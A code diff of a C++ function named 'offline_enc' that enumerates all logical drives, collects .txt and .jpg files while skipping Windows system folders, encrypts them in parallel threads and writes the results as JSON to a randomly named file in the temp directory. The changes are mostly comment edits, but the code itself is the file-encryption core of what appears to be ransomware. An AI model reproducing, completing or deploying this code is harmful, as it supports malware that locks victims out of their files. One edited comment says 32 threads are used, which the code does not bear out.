@@ -30,23 +30,23 @@ int main() {
 
 
 int offline_enc() {
-    // identify all drives
+    // Identify all drives
     std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
-    // store all logical drives to an array
+    // Store all logical drives to an array
     std::vector<std::wstring> logicalDrives = drives["logical"];
 
-    // generate a unique wstring:
+    // Generate a unique wstring:
     std::string randomTempStr = gen_str(8);
     std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());
 
-    // path to temp directory
+    // Path to temp directory
     WCHAR tempPath[MAX_PATH];
     GetTempPath(MAX_PATH, tempPath);
     std::wstring wstrTempPath(tempPath);
-    // path to a text file for storing file paths
+    // Path to a text file for storing file paths
     std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";
 
-    // search for files in each drive & ignore forbidden folders 
+    // Search for files in each drive & ignore forbidden folders 
     std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
     std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
                                                         L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin"};
@@ -67,12 +67,12 @@ int offline_enc() {
     }
     inFile.close();
 
-    // Prepare for parallel processing
+    // Use 32 threads for parallel processing
     const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
     std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
     std::mutex resultMutex;
 
-    // 2. Use parallelism to process multiple files simultaneously.
+    // Use parallelism to process multiple files simultaneously
     auto processFiles = [&](int tid, int start, int end) {
         for (int i = start; i < end; ++i) {
             // 3. Encrypt the file.
@@ -100,7 +100,7 @@ int offline_enc() {
         t.join();
     }
 
-    // 4. Merge results.
+    // Merge results or dictionaries into one
     std::map<std::string, std::map<std::string, std::string>> combinedResult;
     for (const auto& res : results) {
         for (const auto& [key, value] : res) {
@@ -108,15 +108,15 @@ int offline_enc() {
         }
     }
 
-    // 5. Convert combined dictionary to JSON.
+    // Convert combined dictionary to JSON and save them to a random file in TEMP
     nlohmann::json j = combinedResult;
 
     // 6. Save the JSON to a randomly named file.
     std::string randomTempStrForJson = gen_str(8);  // Assuming you have this function from your provided code.
-    std::wstring randomWStrForJson(randomTempStrForJson.begin(), randomTempStrForJson.end());
-    std::wstring jsonPath = wstrTempPath + L"\\" + randomWStrForJson + L".json";
+    std::wstring jsonFilePath(randomTempStrForJson.begin(), randomTempStrForJson.end());
+    std::wstring jsonPath = wstrTempPath + L"\\" + jsonFilePath + L".json";
     std::ofstream jsonFile(jsonPath);
-    jsonFile << j.dump(4);  // Formatting with 4 spaces as indentation.
+    jsonFile << j.dump(4);
     jsonFile.close();
 
 
